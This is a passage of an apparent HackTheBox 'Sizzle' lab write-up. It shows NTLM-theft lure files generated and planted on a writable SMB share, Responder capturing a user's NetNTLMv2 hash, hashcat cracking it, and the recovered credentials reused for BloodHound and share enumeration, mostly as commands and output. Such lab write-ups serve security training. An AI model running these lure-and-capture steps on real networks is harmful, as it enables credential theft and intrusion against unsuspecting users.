+</span></span><span style="display:flex;"><span>  GroupSend.rm                        A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  HideExpand.rm                       A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  InstallWait.pptx                    A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  JoinEnable.ram                      A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  LimitInstall.doc                    A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  LimitStep.ppt                       A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  MergeBlock.mp3                      A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  MountClear.mpeg2                    A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  MoveUninstall.docx                  A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  NewInitialize.doc                   A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  OutConnect.mpeg2                    A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  PingGet.dot                         A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ReceiveInvoke.mpeg2                 A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:56 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  RemoveEnter.mpeg3                   A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  RemoveRestart.mpeg                  A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  RequestJoin.mpeg2                   A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  RequestOpen.ogg                     A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ResetCompare.avi                    A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ResetUninstall.mpeg                 A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ResumeCompare.doc                   A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  SelectPop.ogg                       A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  SuspendWatch.mp4                    A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  SwitchConvertFrom.mpg               A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  UndoPing.rm                         A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  UninstallExpand.mp3                 A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  UnpublishSplit.ppt                  A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  UnregisterPing.pptx                 A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  UpdateRead.mpeg                     A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  WaitRevoke.pptx                     A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  WriteUninstall.mp3                  A   <span style="color:#ae81ff">419430</span>  Mon Jul  <span style="color:#ae81ff">2</span> 15:32:58 <span style="color:#ae81ff">2018</span>
+</span></span></code></pre></div><h2 id="initial-access">Initial Access</h2>
+<h3 id="smb-write-access">SMB Write Access</h3>
+<p>After hitting a bunch of dead ends with entry points, I decided to come back to SMB and see if there were any writeable directories in the <code>Department Shares</code> folder. While there were a ton of folders to go through, I was successful&hellip; we can write at <code>\Users\Public</code>.</p>
+<p>In this case, I&rsquo;m going to use <code>ntlm-theft</code> to generate a handful of files that can, in some cases, steal NTLM hashes of users who may navigate to this directory and/or open any of the files. <a href="https://github.com/Greenwolf/ntlm_theft" target="_blank">NTLM Theft GitHub</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle/ntlmtheft<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 /opt/ntlm_theft/ntlm_theft.py --generate all --server 10.10.14.142 --filename openme
+</span></span><span style="display:flex;"><span>Created: openme/openme.scf <span style="color:#f92672">(</span>BROWSE TO FOLDER<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme-<span style="color:#f92672">(</span>url<span style="color:#f92672">)</span>.url <span style="color:#f92672">(</span>BROWSE TO FOLDER<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme-<span style="color:#f92672">(</span>icon<span style="color:#f92672">)</span>.url <span style="color:#f92672">(</span>BROWSE TO FOLDER<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme.lnk <span style="color:#f92672">(</span>BROWSE TO FOLDER<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme.rtf <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme-<span style="color:#f92672">(</span>stylesheet<span style="color:#f92672">)</span>.xml <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme-<span style="color:#f92672">(</span>fulldocx<span style="color:#f92672">)</span>.xml <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme.htm <span style="color:#f92672">(</span>OPEN FROM DESKTOP WITH CHROME, IE OR EDGE<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme-<span style="color:#f92672">(</span>includepicture<span style="color:#f92672">)</span>.docx <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme-<span style="color:#f92672">(</span>remotetemplate<span style="color:#f92672">)</span>.docx <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme-<span style="color:#f92672">(</span>frameset<span style="color:#f92672">)</span>.docx <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme-<span style="color:#f92672">(</span>externalcell<span style="color:#f92672">)</span>.xlsx <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme.wax <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme.m3u <span style="color:#f92672">(</span>OPEN IN WINDOWS MEDIA PLAYER ONLY<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme.asx <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme.jnlp <span style="color:#f92672">(</span>OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme.application <span style="color:#f92672">(</span>DOWNLOAD AND OPEN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/openme.pdf <span style="color:#f92672">(</span>OPEN AND ALLOW<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/zoom-attack-instructions.txt <span style="color:#f92672">(</span>PASTE TO CHAT<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/Autorun.inf <span style="color:#f92672">(</span>BROWSE TO FOLDER<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Created: openme/desktop.ini <span style="color:#f92672">(</span>BROWSE TO FOLDER<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Generation Complete.
+</span></span></code></pre></div><p>Now upload all of these files to the <code>\Users\Public</code> folder, set up Responder, and wait.
+<code>sudo responder -I tun0</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle/ntlmtheft/openme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient <span style="color:#ae81ff">\\\\</span>10.129.124.103<span style="color:#ae81ff">\\</span>Department<span style="color:#ae81ff">\ </span>Shares
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\p</span>l4stic<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> recurse
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> prompt no
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd Users<span style="color:#ae81ff">\P</span>ublic
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\&gt;</span> mput *
+</span></span><span style="display:flex;"><span>putting file openme.asx as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.asx <span style="color:#f92672">(</span>0.8 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.8 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme-<span style="color:#f92672">(</span>stylesheet<span style="color:#f92672">)</span>.xml as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme-<span style="color:#f92672">(</span>stylesheet<span style="color:#f92672">)</span>.xml <span style="color:#f92672">(</span>2.1 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.2 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme.m3u as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.m3u <span style="color:#f92672">(</span>0.5 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.0 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme.htm as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.htm <span style="color:#f92672">(</span>1.1 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.0 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file Autorun.inf as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\A</span>utorun.inf <span style="color:#f92672">(</span>1.0 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.0 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme-<span style="color:#f92672">(</span>includepicture<span style="color:#f92672">)</span>.docx as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme-<span style="color:#f92672">(</span>includepicture<span style="color:#f92672">)</span>.docx <span style="color:#f92672">(</span>75.6 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 16.4 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme.pdf as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.pdf <span style="color:#f92672">(</span>6.4 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 14.9 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme.jnlp as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.jnlp <span style="color:#f92672">(</span>2.1 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 13.5 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme-<span style="color:#f92672">(</span>externalcell<span style="color:#f92672">)</span>.xlsx as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme-<span style="color:#f92672">(</span>externalcell<span style="color:#f92672">)</span>.xlsx <span style="color:#f92672">(</span>5.5 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 9.1 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme-<span style="color:#f92672">(</span>fulldocx<span style="color:#f92672">)</span>.xml as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme-<span style="color:#f92672">(</span>fulldocx<span style="color:#f92672">)</span>.xml <span style="color:#f92672">(</span>294.1 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 41.4 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme.wax as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.wax <span style="color:#f92672">(</span>0.7 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 40.0 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file zoom-attack-instructions.txt as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\z</span>oom-attack-instructions.txt <span style="color:#f92672">(</span>1.4 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 38.7 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme.application as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.application <span style="color:#f92672">(</span>21.2 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 38.1 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme.scf as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.scf <span style="color:#f92672">(</span>0.9 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 36.7 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme.lnk as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.lnk <span style="color:#f92672">(</span>26.8 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 36.4 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme-<span style="color:#f92672">(</span>remotetemplate<span style="color:#f92672">)</span>.docx as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme-<span style="color:#f92672">(</span>remotetemplate<span style="color:#f92672">)</span>.docx <span style="color:#f92672">(</span>259.3 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 44.8 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme-<span style="color:#f92672">(</span>url<span style="color:#f92672">)</span>.url as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme-<span style="color:#f92672">(</span>url<span style="color:#f92672">)</span>.url <span style="color:#f92672">(</span>0.7 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 43.5 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme.rtf as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme.rtf <span style="color:#f92672">(</span>1.3 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 42.4 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme-<span style="color:#f92672">(</span>frameset<span style="color:#f92672">)</span>.docx as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme-<span style="color:#f92672">(</span>frameset<span style="color:#f92672">)</span>.docx <span style="color:#f92672">(</span>128.0 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 44.7 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file desktop.ini as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\d</span>esktop.ini <span style="color:#f92672">(</span>0.5 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 43.3 kb/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>putting file openme-<span style="color:#f92672">(</span>icon<span style="color:#f92672">)</span>.url as <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\o</span>penme-<span style="color:#f92672">(</span>icon<span style="color:#f92672">)</span>.url <span style="color:#f92672">(</span>1.3 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 42.2 kb/s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>And we got a hash for <code>amanda</code>!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.129.124.103
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : HTB<span style="color:#ae81ff">\a</span>manda
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : amanda::HTB:8a9f1b623bfe46f5:384CA8E4CB42B0ECDE0D9B7F1C269094:01010000000000008068928ADB87DB01F4727A7770FD53BE00000000020008004A0037004300320001001E00570049004E002D00410059005A004E004900300054005A0030003800450004003400570049004E002D00410059005A004E004900300054005A003000380045002E004A003700430032002E004C004F00430041004C00030014004A003700430032002E004C004F00430041004C00050014004A003700430032002E004C004F00430041004C00070008008068928ADB87DB0106000400020000000800300030000000000000000100000000200000AB323F71F0E9979946045431F8B44E0E8D558B1768754391F2DCC6D3CF5DA9E00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310034003200000000000000000000000000
+</span></span></code></pre></div><h3 id="ntlmv2-hash-crack">NTLMv2 Hash Crack</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle/ntlmtheft/openme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hashcat amanda-hash.txt /usr/share/wordlists/rockyou.txt 
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting in autodetect mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...snip...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>AMANDA::HTB:8a9f1b623bfe46f5:384ca8e4cb42b0ecde0d9b7f1c269094:01010000000000008068928adb87db01f4727a7770fd53be00000000020008004a0037004300320001001e00570049004e002d00410059005a004e004900300054005a0030003800450004003400570049004e002d00410059005a004e004900300054005a003000380045002e004a003700430032002e004c004f00430041004c00030014004a003700430032002e004c004f00430041004c00050014004a003700430032002e004c004f00430041004c00070008008068928adb87db0106000400020000000800300030000000000000000100000000200000ab323f71f0e9979946045431f8b44e0e8d558b1768754391f2dcc6d3cf5da9e00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310034003200000000000000000000000000:Ashare1972
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">5600</span> <span style="color:#f92672">(</span>NetNTLMv2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: AMANDA::HTB:8a9f1b623bfe46f5:384ca8e4cb42b0ecde0d9b...000000
+</span></span><span style="display:flex;"><span>Time.Started.....: Tue Feb <span style="color:#ae81ff">25</span> 23:21:51 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Tue Feb <span style="color:#ae81ff">25</span> 23:21:55 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>And finally, some creds: <code>HTB.local\amanda:Ashare1972</code></p>
+<h2 id="amandas-credentials">Amanda&rsquo;s Credentials</h2>
+<h3 id="bloodhound">Bloodhound</h3>
+<p>Let&rsquo;s see if Amanda&rsquo;s credentials can get us a Bloodhound dump via LDAP, and then explore what our next steps might be.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netexec ldap 10.129.124.103 -d htb.local -u amanda -p <span style="color:#e6db74">&#39;Ashare1972&#39;</span> --bloodhound -c all --dns-server 10.129.124.103 --dns-tcp
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:SIZZLE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:HTB.LOCAL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.124.103  <span style="color:#ae81ff">389</span>    SIZZLE           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> htb.local<span style="color:#ae81ff">\a</span>manda:Ashare1972 
+</span></span><span style="display:flex;"><span>LDAP        10.129.124.103  <span style="color:#ae81ff">389</span>    SIZZLE           Resolved collection methods: dcom, acl, objectprops, rdp, container, trusts, localadmin, psremote, group, session
+</span></span><span style="display:flex;"><span>LDAP        10.129.124.103  <span style="color:#ae81ff">389</span>    SIZZLE           Done in 00M 07S
+</span></span><span style="display:flex;"><span>LDAP        10.129.124.103  <span style="color:#ae81ff">389</span>    SIZZLE           Compressing output into /home/pl4stic/.nxc/logs/SIZZLE_10.129.124.103_2025-02-25_233948_bloodhound.zip
+</span></span></code></pre></div><p>Looks like Amanda has <code>CanPSRemote</code> to the <code>SIZZLE.HTB.LOCAL</code> machine&hellip; tried using <code>evil-winrm</code> but no luck. Maybe we need a stronger form of authentication?</p>
+<p><img src="/images/sizzle2.png" alt="sizzle2"></p>
+<h3 id="smb">SMB</h3>
+<p>Looks like Amanda&rsquo;s credentials got us a bit more access to the SMB shares, let&rsquo;s check them out.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle/ntlmtheft/openme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netexec smb 10.129.124.103 -d htb.local -u amanda -p <span style="color:#e6db74">&#39;Ashare1972&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:SIZZLE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:HTB.LOCAL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> htb.local<span style="color:#ae81ff">\a</span>manda:Ashare1972 
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           CertEnroll      READ            Active Directory Certificate Services share                                                                                                                 
